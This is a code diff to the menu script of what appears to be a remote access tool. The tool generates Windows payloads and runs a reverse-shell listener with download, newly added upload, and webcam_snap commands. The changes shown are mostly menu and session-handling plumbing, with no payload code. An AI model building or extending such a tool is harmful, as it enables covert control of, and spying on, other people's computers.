@@ -97,7 +97,6 @@ def payload_generate():
 def generate_script():
     menu = "=========================================================\n"
     menu += "Choose the platform you want to run        \n"
-    # menu += "Generate with camera function will make the exe filesize increase to about 50M \n\n"
     menu += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate script running on Windows\n"
     # menu += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script running on Unix-Like system\n"
     menu += "========================================================\n"
@@ -131,9 +130,6 @@ def generate_script():
                 continue
         # Start generate
         payload_generate()
-        banner()
-        show_menu()
-        select()
     else:
         print(bcolors.RED + "Invalid choice" + bcolors.ENDC)
         time.sleep(0.5)
@@ -153,6 +149,7 @@ def start_listening():
     menu += "The Listening mode is base on Reverse Shell        \n"
     menu += "You can use some extra command below \n\n"
     menu += bcolors.GREEN + "download <remote filename> <local filename>\n" + bcolors.ENDC
+    menu += bcolors.GREEN + "upload <local filename> <remote filename>\n" + bcolors.ENDC
     menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
     menu += "========================================================\n"
     print(menu)
@@ -160,7 +157,9 @@ def start_listening():
     l = listen.Listening(host, int(port))
     while 1:
         se = input()
-        if se[:8] == 'sessions':
+        if se[:4] == "exit":
+            break
+        elif se[:8] == 'sessions':
             if l.sessions.keys():
                 for k in l.sessions.keys():
                     print(bcolors.GREEN + f"Session {k} open" + bcolors.ENDC)
@@ -191,7 +190,7 @@ def start_listening():
                     parent_conn = ses[0]
                     while 1:
                         cmd = input()
-                        if cmd == "exit":
+                        if cmd == "background":
                             print(bcolors.OCRA + f"session {num} background.." + bcolors.ENDC)
                             break
                         else:
@@ -203,15 +202,18 @@ def start_listening():
                   "       session num : open a alive session\n" +
                   "       session [-d] num : delete a session\n" +
                   "       session -t : terminate all sessions\n" +
-                  "       exit (in session) : backgroud session\n"
-            )
+                  "       exit : back to main menu\n" +
+                  "       background (in session) : backgroud session\n"
+                  )
 
 
 if __name__ == '__main__':
-    try:
-        init()
-        banner()
-        show_menu()
-        select()
-    except KeyboardInterrupt:
-        print("Exit...")
+    init()
+    while 1:
+        try:
+            banner()
+            show_menu()
+            select()
+        except KeyboardInterrupt:
+            print("\nExit...")
+            break
